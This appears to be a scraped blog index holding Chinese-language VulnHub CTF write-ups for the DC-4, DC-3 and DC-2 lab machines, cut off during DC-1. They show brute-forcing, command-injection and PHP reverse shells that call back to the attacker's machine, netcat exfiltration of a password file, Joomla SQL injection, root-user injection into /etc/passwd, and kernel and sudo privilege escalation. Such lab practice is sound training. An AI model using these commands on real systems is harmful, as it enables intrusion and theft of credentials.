SERVICE VERSION22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: | 2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)| 256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)|_ 256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)80/tcp open http nginx 1.15.10|_http-server-header: nginx/1.15.10|_http-title: System ToolsMAC Address: 08:00:27:CE:6C:2F (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Mar 14 19:22:45 2022 -- 1 IP address (1 host up) scanned in 21.51 seconds使用Hydra暴力破解HTTP Post LoginWeb是一个登录页面经过测试，并不存在Sql Injection这里我们应该需要暴力破解密码,用户名一般是 admin, 使用hydra 爆破密码字典使用 rockyou.txt$ zcat /usr/share/wordlist/rockyou.txt.zip &gt; ~/rockyou.gz# 解压字典hydra -l admin -P ~/rockyou.txt 172.16.1.148 http-post-form \"/login.php:username=^USER^&amp;password=^PASS^:S=logout\"Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-15 08:23:15[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task[DATA] attacking http-post-form://172.16.1.148:80/login.php:username=^USER^&amp;password=^PASS^:S=logout[80][http-post-form] host: 172.16.1.148 login: admin password: happy1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-15 08:23:46用户名/密码admin:happyPOST 提交的命令参数可控，利用 nc 反弹 shell登录后台后有一个command.php页面，存在命令执行http://172.16.1.148/command.php登录后直接进入 command.php 页面, 点击RUN 用burp 查看提交数据POST 提交数据POST /command.php HTTP/1.1Host: 172.16.1.148Content-Length: 22Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://172.16.1.148Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://172.16.1.148/command.phpAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: PHPSESSID=v1k8sd6gb9j0tp29br56irvhu7Connection: closeradio=ls+-l&amp;submit=RunYou have selected: ls -l total 24-rw-r--r-- 1 root root 1783 Apr 5 2019 command.phpdrwxr-xr-x 2 root root 4096 Mar 24 2019 cssdrwxr-xr-x 2 root root 4096 Mar 24 2019 images-rw-r--r-- 1 root root 506 Apr 6 2019 index.php-rw-r--r-- 1 root root 1473 Apr 7 2019 login.php-rw-r--r-- 1 root root 663 Mar 24 2019 logout.php命令参数是可控的，接下来进行反弹shellkali IP : 172.16.1.83nc -lvp 1234修改POST数据, 利用nc 反弹shellPOST /command.php HTTP/1.1Host: 172.16.1.148Content-Length: 22Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://172.16.1.148Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://172.16.1.148/command.phpAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: PHPSESSID=v1k8sd6gb9j0tp29br56irvhu7Connection: closeradio=nc 172.16.1.83 1234 -e /bin/bash%26&amp;submit=Run重放kaliroot@kali:~/vulnhub/DC-4# nc -lvp 1234listening on [any] 1234 ...172.16.1.148: inverse host lookup failed: Unknown hostconnect to [172.16.1.83] from (UNKNOWN) [172.16.1.148] 43174python -c \"import pty;pty.spawn('/bin/bash')\"www-data@dc-4:/usr/share/nginx/html$ ttytty/dev/pts/1www-data@dc-4:/usr/share/nginx/html$ export TERM=xterm-256colorexport TERM=xterm-256colorwww-data@dc-4:/usr/share/nginx/html$ ^Z[1]+ 已停止 nc -lvp 1234root@kali:~/vulnhub/DC-4# stty raw -echoroot@kali:~/vulnhub/DC-4# nc -lvp 1234www-data@dc-4:/usr/share/nginx/html$ lscommand.php css images index.php login.php\tlogout.phpwww-data@dc-4:/usr/share/nginx/html$使用 Hydra 暴力破解 ssh 密码拿到shell 后, 进行 服务器内部信息收集 提升当前权限在 用户jim 的加目录发现一个./backups/old-passwords.bak看到old passowrd 就感觉 与 jim 密码有关，它大概是一个字典文件将该文件传输到 kali ,再使用hydra 指定字典爆破 用户jiim 的密码使用 nc 传输文件kali IP 172.16.1.83nc -lvp 12 &gt; ord-password.txt靶机:nc 172.16.1.83 12 &lt; /home/jim/backups/old-passwords.bak然后等上几秒，等待文件参数完成.接下来使用hydra 暴力破解 jim 的密码hydra -l jim -P old-passwords.txt ssh://172.16.1.148Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-15 09:10:33[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:1/p:252), ~16 tries per task[DATA] attacking ssh://172.16.1.148:22/[STATUS] 182.00 tries/min, 182 tries in 00:01h, 76 to do in 00:01h, 16 active[22][ssh] host: 172.16.1.148 login: jim password: jibril041 of 1 target successfully completed, 1 valid password found[WARNING] Writing restore file because 5 final worker threads did not complete until end.[ERROR] 5 targets did not resolve or could not be connected[ERROR] 16 targets did not completeHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-15 09:12:06用户名/密码jim:jibril04直接ssh登录在 jim 家目录 有一个 mbox 大概是一个邮件,然后呢我就去 /var/mail/ 只有一个 jimcat 查看From charles@dc-4 Sat Apr 06 21:15:46 2019Return-path: &lt;charles@dc-4&gt;Envelope-to: jim@dc-4Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000Received: from charles by dc-4 with local (Exim 4.89)\t(envelope-from &lt;charles@dc-4&gt;)\tid 1hCjIX-0000kO-Qt\tfor jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000To: jim@dc-4Subject: HolidaysMIME-Version: 1.0Content-Type: text/plain; charset=\"UTF-8\"Content-Transfer-Encoding: 8bitMessage-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;From: Charles &lt;charles@dc-4&gt;Date: Sat, 06 Apr 2019 21:15:45 +1000Status: OHi Jim,I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.Password is: ^xHhA&amp;hvim0ySee ya,Charles大概内容就是嗨，jim，我今天年底要放假，所以老板让我把密码给你，以防万一。然后我们就莫名其妙的的得到了 charles 的密码charles:^xHhA&amp;hvim0y普通用户可以root 的身份运行 /usr/bin/teehee 进行提权su 切换到 charles, 再 sudo -l，发现我们可以无需密码以 root 的身份 运行 /usr/bin/teehee 命令jim@dc-4:/var/mail$ su charlesPassword: charles@dc-4:/var/mail$ sudo -lMatching Defaults entries for charles on dc-4: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser charles may run the following commands on dc-4: (root) NOPASSWD: /usr/bin/teehee经过一番研究, teehee 可以再文件内容末尾追加 内容我们可以 在 /etc/passwd 下追加实现添加uid 为0的用户(root用户)先生成一个密码hashroot@kali:~/vulnhub/DC-4# mkpasswd 123456BFQmQnKyI889I将以下x 替换成 上面的hashr00t:x:0:0:root:/root:/bin/bash--&gt;r00t:BFQmQnKyI889I:0:0:root:/root:/bin/bash靶机charles@dc-4:/var/mail$ sudo /usr/bin/teehee /etc/passwd -ar00t:BFQmQnKyI889I:0:0:root:/root:/bin/bash r00t:BFQmQnKyI889I:0:0:root:/root:/bin/bash^Ccharles@dc-4:/var/mail$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false_apt:x:104:65534::/nonexistent:/bin/falsemessagebus:x:105:109::/var/run/dbus:/bin/falsesshd:x:106:65534::/run/sshd:/usr/sbin/nologinnginx:x:107:111:nginx user,,,:/nonexistent:/bin/falsecharles:x:1001:1001:Charles,,,:/home/charles:/bin/bashjim:x:1002:1002:Jim,,,:/home/jim:/bin/bashsam:x:1003:1003:Sam,,,:/home/sam:/bin/bashDebian-exim:x:108:112::/var/spool/exim4:/bin/falser00t:BFQmQnKyI889I:0:0:root:/root:/bin/bash我们已经成功的将r00t:BFQmQnKyI889I:0:0:root:/root:/bin/bash写入 /etc/passwd 文件内现在直接 su r00t，密码 123456charles@dc-4:/var/mail$ su rootPassword: su: Authentication failurecharles@dc-4:/var/mail$ sudo /usr/bin/teehee /etc/passwd -ar00t:BFQmQnKyI889I:0:0:root:/root:/bin/bashr00t:BFQmQnKyI889I:0:0:root:/root:/bin/bash^Ccharles@dc-4:/var/mail$ su r00tPassword: root@dc-4:/var/mail# cd /root@dc-4:/# cd /rootroot@dc-4:~# lsflag.txtroot@dc-4:~# cat flag.txt 888 888 888 888 8888888b. 888 888 888 888 888 o 888 888 888 888 \"Y88b 888 888 888 888 888 d8b 888 888 888 888 888 888 888 888 888 888 d888b 888 .d88b. 888 888 888 888 .d88b. 88888b. .d88b. 888 888 888 888 888d88888b888 d8P Y8b 888 888 888 888 d88\"\"88b 888 \"88b d8P Y8b 888 888 888 888 88888P Y88888 88888888 888 888 888 888 888 888 888 888 88888888 Y8P Y8P Y8P Y8P 8888P Y8888 Y8b. 888 888 888 .d88P Y88..88P 888 888 Y8b. \" \" \" \" 888P Y888 \"Y8888 888 888 8888888P\" \"Y88P\" 888 888 \"Y8888 888 888 888 888 Congratulations!!!Hope you enjoyed DC-4. Just wanted to send a big thanks out there to all thosewho have provided feedback, and who have taken time to complete these littlechallenges.If you enjoyed this CTF, send me a tweet via @DCAU7.root@dc-4:~# END *" }, { "title": "VulnHub-DC-3", "url": "/posts/Vulnhub-DC-3/", "categories": "vulnhub", "tags": "vulnhub", "date": "2022-03-14 00:00:00 +0800", "snippet": "2022 年 3 月 14 日，星期一Description DC-3是另一个专门构建的易受攻击的实验室，旨在获得渗透测试领域的经验。 与以前的DC版本一样，这个版本在设计时考虑到了初学者，尽管这一次只有一个标志，一个入口点，根本没有线索。 Linux技能和对Linux命令行的熟悉程度是必须的，基本的渗透测试工具的一些经验也是必须的。 对于初学者来说，Google可以提供很大的帮助，但你可以随时在@DCAU7上发推文给我，寻求帮助，让你重新开始。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。 对于那些有CTF和Boot2Root挑战经验的人来说，这可能根本不会花费你很长时间（事实上，它可能需要不到20分钟的时间）。 如果是这样的话，如果你希望它成为一个更大的挑战，你可以随时重做挑战，并探索其他获得根和获得旗帜的方法。Table of Content nmap 使用 joomscan 扫描 Joomla 站点 使用 searchsploit 搜索关于 Joomla 的漏洞 使用 sqlmap 利用 CVE-2017-8917 手工利用(CVE-2017-8917)(sql injection error) 使用exists 函数结合报错sql Injection爆破表的字段 使用 john 破解admin的密码hash (joomla CMS) 使用 msfconsole 利用 CVE-2017-8917 RCE 特权提升CVE-2016-4557nmap# nmap -sV -p- -sC -oN nmap 172.16.1.94Starting Nmap 7.70 ( https://nmap.org ) at 2022-03-12 17:59 CSTNmap scan report for 172.16.1.94Host is up (0.0013s latency).Not shown: 65534 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-generator: Joomla! - Open Source Content Management|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: HomeMAC Address: 08:00:27:57:44:0A (Oracle VirtualBox virtual NIC)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 23.08 seconds只开了一个80端口，http-generator 显示 Joomal,应该是一个Joomla CMS使用 joomscan 扫描 Joomla 站点$ # joomscan -u http://172.16.1.94/ ____ _____ _____ __ __ ___ ___ __ _ _ (_ _)( _ )( _ )( \\/ )/ __) / __) /__\\ ( \\( ) .-_)( )(_)( )(_)( ) ( \\__ \\( (__ /(__)\\ ) ( \\____) (_____)(_____)(_/\\/\\_)(___/ \\___)(__)(__)(_)\\_) (1337.today) --=[OWASP JoomScan +---++---==[Version : 0.0.7 +---++---==[Update Date : [2018/09/23] +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo --=[Code name : Self Challenge @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASPProcessing http://172.16.1.94/ ...[+] FireWall Detector[++] Firewall not detected[+] Detecting Joomla Version[++] Joomla 3.7.0[+] Core Joomla Vulnerability[++] Target Joomla core is not vulnerable[+] Checking Directory Listing[++] directory has directory listing : http://172.16.1.94/administrator/componentshttp://172.16.1.94/administrator/moduleshttp://172.16.1.94/administrator/templateshttp://172.16.1.94/images/banners[+] Checking apache info/status files[++] Readable info/status files are not found[+] admin finder[++] Admin page : http://172.16.1.94/administrator/[+] Checking robots.txt existing[++] robots.txt is not found[+] Finding common backup files name[++] Backup files are not found[+] Finding common log files name[++] error log is not found[+] Checking sensitive config.php.x file[++] Readable config files are not foundYour Report : reports/172.16.1.94/版本 : Joomla 3.7.0使用 searchsploit 搜索关于 Joomla 的漏洞root@kali:~/vulnhub/DC-3# searchsploit Joomla 3.7.0------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/)------------------------------------------------------------------------------------- ----------------------------------------Joomla! 3.7.0 - 'com_fields' SQL Injection | exploits/php/webapps/42033.txt------------------------------------------------------------------------------------- ----------------------------------------# 将文件拷贝到当前路径下root@kali:~/vulnhub/DC-3# searchsploit -m exploits/php/webapps/42033.txtCVE-2017-8917使用 sqlmap 利用 CVE-2017-8917查看所有数据库$ sqlmap -u \"http://172.16.1.94/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml\" --dbs[*] information_schema[*] joomladb[*] mysql[*] performance_schema[*] sys查看joomladb数据库的表sqlmap -u \"http://172.16.1.94/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml\" -D joomladb --tables# 展示主要一个***'#__users'***查询字段的时候出现问题，查询不到任何数据sqlmap -u \"http://172.16.1.94/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml\" -D joomladb -T '#__users' --columns --batch手工利用(CVE-2017-8917)(sql injection error)基于报错注入查看当前使用数据库http://172.16.1.94/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,(database()),0x7e),1)XPATH syntax error: '~joomladb~'可以正常使用使用exists 函数结合报错sql Injection爆破表的字段直接编写python脚本来爆破字段import requestsimport re# DC-3靶机的ipip = '172.16.1.94'def get_columns_name(args): url = f\"http://\"+ip+\"/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml(1,concat(0x5e,(exists(select+{args}+from+%23__users)),0x5e),1)\" v1 = requests.get(url=url).text v2 = re.findall('\\^1\\^',v1) if v2: print(args)with open('/usr/share/sqlmap/txt/common-columns.txt','r') as f: for l in f.readlines(): get_columns_name(l[:-1])# python3 get_columns_name.py idnameusernameemailpasswordpasswordusernamenameparams\t直接查询name 内容 ,应该是登录用户名http://172.16.94/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml(1,concat(0x5e,(select+name+from+%23__users),0x5e),1) XPATH syntax error: '^admin^' 查询password内容http://172.16.1.94/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x5e,(select+password+from+%23__users),0x5e),1)XPATH syntax error: '^$2y$10$DpfpYjADpejngxNh9GnmCeyI'密码比较长，而concat只能显示前32个，这里我们需要使用substr函数分段获取http://172.16.1.94/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x5e,substr((select+password+from+%23__users),1,30),0x5e),1)'^$2y$10$DpfpYjADpejngxNh9GnmCey^'http://172.16.1.94/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x5e,substr((select+password+from+%23__users),31,30),0x5e),1)'^IHCWpL97CVRnGeZsVJwR0kWFlfB1Zu^'http://172.16.1.94/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x5e,substr((select+password+from+%23__users),50,30),0x5e),1)'^R0kWFlfB1Zu^'拼起来就是登录用户名 admin密码hash $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu使用 john 破解admin的密码hash (joomla CMS)将密码hash 写到 hash.txt$ echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' &gt; hash.txt$ john hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 1024 for all loaded hashesProceeding with single, rules:WordlistPress 'q' or Ctrl-C to abort, almost any other key for statusAlmost done: Processing the remaining buffered candidate passwords, if anyProceeding with wordlist:/usr/share/john/password.lst, rules:Wordlistsnoopy (?)1g 0:00:00:00 DONE 2/3 (2022-03-14 08:29) 1.075g/s 38.70p/s 38.70c/s 38.70C/s mustang..busterUse the \"--show\" option to display all of the cracked passwords reliablySession completed后台登录用户/密码admin/snoopy后台登录地址http://172.16.1.94/administrator文件上传位置Extensions--&gt;Templates--&gt;Templates--&gt;Styles--&gt;protostar -Default找到 index.php写入&lt;?php\tsystem(\"bash -c 'bash -i &gt;&amp;/dev/tcp/kaliip/4444 0&gt;&amp;1'\")?&gt;kali cmdnc -lvp 4444然后访问 网站根get_shell使用 msfconsole 利用 CVE-2017-8917 RCE直接GET Shell ，不行的话多试几次msf6 &gt; use exploit/unix/webapp/joomla_comfields_sqli_rce[*] No payload configured, defaulting to php/meterpreter/reverse_tcpmsf6 exploit(unix/webapp/joomla_comfields_sqli_rce) &gt; set rhosts 172.16.1.94rhosts =&gt; 172.16.1.94msf6 exploit(unix/webapp/joomla_comfields_sqli_rce) &gt; set payload php/reverse_phppayload =&gt; php/reverse_phpmsf6 exploit(unix/webapp/joomla_comfields_sqli_rce) &gt; run接下来进行内部信息收集python -c \"import pty;pty.spawn('/bin/bash')\"export TERM=xtermwww-data@DC-3:/$ uname -aLinux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux特权提升CVE-2016-4557exploits/linux/local/39772.txt提权文件链接https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip提权文件大概使用过程$ wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip$ unzip 39772.zip$ cd 39772$ tar -xvf exploit.tar$ cd ebpf_mapfd_doubleput_exploit$ chmod +x ./compile.sh$ ./compile.sh$ ./doubleputOK !root@DC-3:/root# cat the-flag.txt __ __ _ _ ____ _ _ _ _ \\ \\ / /__| | | | _ \\ ___ _ __ ___| | | | | \\ \\ /\\ / / _ \\ | | | | | |/ _ \\| '_ \\ / _ \\ | | | | \\ V V / __/ | | | |_| | (_) | | | | __/_|_|_|_| \\_/\\_/ \\___|_|_| |____/ \\___/|_| |_|\\___(_|_|_|_) Congratulations are in order. :-)I hope you've enjoyed this challenge as I enjoyed making it.If there are any ways that I can improve these little challenges,please let me know.As per usual, comments and complaints can be sent via Twitter to @DCAU7Have a great day!!!!root@DC-3:/root#" }, { "title": "VulnHub-DC-2", "url": "/posts/Vulnhub-DC-2/", "categories": "vulnhub", "tags": "vulnhub", "date": "2022-03-12 00:00:00 +0800", "snippet": "Description 与 DC-1 非常相似，DC-2 是另一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验。 与最初的 DC-1 一样，它的设计考虑到了初学者。 必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。 就像 DC-1 一样，有五个标志，包括最终标志。 再说一次，就像 DC-1 一样，标志对初学者很重要，但对有经验的人来说并不那么重要。 简而言之，唯一真正重要的标志是最终标志。 对于初学者来说，谷歌是你的朋友。好吧，除了所有的隐私问题等等等等。 我还没有探索实现 root 的所有方法，因为我放弃了我一直在研究的以前的版本，并从基本操作系统安装之外完全重新开始。Table of Content nmap 使用cewl生成密码字典 使用wpscan枚举wordpress用户 使用wpscan枚举wordpress用户的密码 使用msf模块暴力破解wordpress后台登录密码 ssh登录系统,绕过rbash的限制 sudo git 提权nmaproot@kali:~/vulnhub/DC-2# nmap -sV -p- 172.16.1.93 -sC -oN nmapNmap scan report for 172.16.1.93Host is up (0.0016s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Did not follow redirect to http://dc-2/7744/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)| ssh-hostkey: | 1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)| 2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)| 256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)|_ 256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)MAC Address: 08:00:27:E8:B3:60 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 5.50 seconds修改渗透的/etc/hosts文件添加# 靶机IP DC-2172.16.1.93 DC-2WebFLAG 1http://dc-2/index.php/flag/FlagFlag 1:Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.More passwords is always better, but sometimes you just can’t win them all.Log in as one to see the next flag.If you can’t find it, log in as another.使用cewl生成密码字典cewl http://dc-2/ &gt; dic.txt使用wpscan枚举wordpress用户从安装wpscan开始wpscan --url http://dc-2/ -e u#最终枚举出3位adminjerrytomz使用wpscan枚举wordpress用户的密码wpscan --url http://dc-2 -U tom,jerry -P dic.txt# 最终得到'jerry' : 'adipiscing''tom' : 'parturient'使用msf模块暴力破解wordpress后台登录密码$ cat /root/user.txtadmintomjerry$ msfconsolemsf6&gt; use scanner/http/wordpress_xmlrpc_loginmsf6&gt; set user_file /root/user.txtmsf6&gt; set pass_file /root/dic.txtmsf6&gt; run# 最终得到'jerry' : 'adipiscing''tom' : 'parturient'jerry:adipiscing登录后台 发现flag2url:http://dc-2/wp-admin/post.php?post=21&amp;action=editFLAG 2Flag 2:If you can't exploit WordPress and take a shortcut, there is another way.Hope you found another entry point.ssh登录系统,绕过rbash的限制用户和密码tom:parturient尝试通过ssh登录系统$ ssh tom@dc-2 -p 7744# 登录成功无法使用 /tom@DC-2:~$ /bin/su-rbash: /bin/su: restricted: cannot specify `/' in command namestom@DC-2:~$ echo $SHELL/bin/rbashrbash 是什么？ 如今网络安全行业越来越规范，我们还想直接获取到未限制的shell是件很困难的事情，系统运维人员一般都会给Linux shell加上一些限制来防止入侵，通常会阻止运行某些特定的命令。常见的受限shell环境类型包括rbash、rksh和rsh接下来进行绕过# 通过vi 绕过rbashvi 1: set shell=/bin/sh:shell继续$ /bin/su# 可以使用tom 登录环境是 /bin/rbash，而 jerry 登录环境是/bin/bash *注 ： jerry 用户不能直接通过 ssh 登录 需要我们先使用 tom 登录系统然后su jerry *tom@DC-2:/home/tom$ /bin/cat /etc/passwd |grep bashroot:x:0:0:root:/root:/bin/bashtom:x:1001:1001:Tom Cat,,,:/home/tom:/bin/rbashjerry:x:1002:1002:Jerry Mouse,,,:/home/jerry:/bin/bashjerry 的密码上面已经得到了尝试su切换用户jerry:adipiscingtom@DC-2:/home/tom$ /bin/su jerryjerry@DC-2:/home/tom$ whoamijerrysudo git 提权jerry@DC-2:/home/tom$ sudo -lMatching Defaults entries for jerry on DC-2: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser jerry may run the following commands on DC-2: (root) NOPASSWD: /usr/bin/gitjerry@DC-2:/home/tom$ sudo /usr/bin/git -p help config!/bin/bash# 直接输入 !/bin/bash!/bin/bashroot@DC-2:/home/tom# ENDroot@DC-2:/home/tom# iduid=0(root) gid=0(root) groups=0(root)root@DC-2:/home/tom# cd ~root@DC-2:~# lsfinal-flag.txtroot@DC-2:~# cat final-flag.txt __ __ _ _ _ _ / / /\\ \\ \\___| | | __| | ___ _ __ ___ / \\\\ \\/ \\/ / _ \\ | | / _` |/ _ \\| '_ \\ / _ \\/ / \\ /\\ / __/ | | | (_| | (_) | | | | __/\\_/ \\/ \\/ \\___|_|_| \\__,_|\\___/|_| |_|\\___\\/ Congratulatons!!!A special thanks to all those who sent me tweetsand provided me with feedback - it's all greatlyappreciated.If you enjoyed this CTF, send me a tweet via @DCAU7.root@DC-2:~#*补充:jerry 不能直接通过ssh连接尝试scp*" }, { "title": "VulnHub-DC-1", "url": "/posts/VulnHub-DC-1/", "categories": "vulnhub", "tags": "vulnhub", "date": "2022-03-11 00:00:00 +0800", "snippet": "Description DC-1 是一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。 它旨在为初学者带来挑战，但它的简单程度取决于您的技能和知识以及您的学习能力。 要成功完成这一挑战，您将需要 Linux 技能、熟悉 Linux 命令行以及使用基本渗透测试工具的经验，例如可以在 Kali Linux 或 Parrot Security OS 上找到的工具。 有多种获得 root 的方法，但是，我已经包含了一些包含初学者线索的标志。 总共有五个标志，但最终目标是在 root 的主目录中找到并读取标志。您甚至不需要成为 root 即可执行此操作，但是，您将需要 root 权限。 根据您的技能水平，您可能可以跳过查找大多数这些标志并直接获取根。 初学者可能会遇到他们以前从未遇到过的挑战，但谷歌搜索应该是获取完成这一挑战所需信息的全部内容。Table of Content nmap DrupalCMS漏洞的利用(CVE-2014-3704) 在mysql更改admin的密码hash。 利用设置了 SUID 位的 find 提权namp# Nmap 7.70 scan initiated Fri Mar 11 09:00:18 2022 as: nmap -sV -p- -sC -oN nmap 172.16.1.79Nmap scan report for 172.16.1.79Host is up (0.0023s latency).Not shown: 65531 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)| ssh-hostkey: | 1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)| 2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)|_ 256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)80/tcp open http Apache httpd 2.2.22 ((Debian))|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache/2.2.22 (Debian)|_http-title: Welcome to Drupal Site | Drupal Site111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100024 1 40415/udp status|_ 100024 1 47784/tcp status47784/tcp open status 1 (RPC #100024)MAC Address: 08:00:27:AA:94:9F (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Mar 11 09:00:41 2022 -- 1 IP address (1 host up) scanned in 23.18 secondsDrupalCMS漏洞的利用(CVE-2014-3704)Web 是一个 Drupal Site CMSmsf6&gt; use 